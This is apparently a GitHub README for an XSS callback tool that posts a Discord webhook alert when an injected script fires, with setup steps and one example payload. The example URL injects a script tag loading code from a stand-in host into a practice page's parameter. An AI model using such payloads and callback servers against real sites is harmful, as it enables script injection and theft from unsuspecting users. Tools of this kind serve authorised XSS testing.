<h3 align="center"> Send XSS Report Via Discord WebHook  </h4>
<p align="center">
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#preview">Preview</a> 

</p>

---

This Code Send Notification on Discord TextChannel When Xss payload it's Worked .

## Installation
 Clone Repository :
```
git clone github.com/zi-gax/XSS-WebHook
```
Add Files To Web Page Directory And Run This Code For Wirte File Permission :


```
chown www-data:www-data reports/
```

Edit WebHook url In index.php :
```
line 9 $webhookUrl 
```

## Preview

![photo_2023-07-02_01-22-59](https://github.com/zi-gax/XSS-WebHook/assets/67065043/c1443925-0b1d-462d-81ac-432cf42c6efd)

## Usage

### For Example 
use link web page in payload :
```
https://brutelogic.com.br/gym.php?p01=test2%3C/title%3E%3Cscript%20src=//site.tld%20%3E%3C/script%3E
```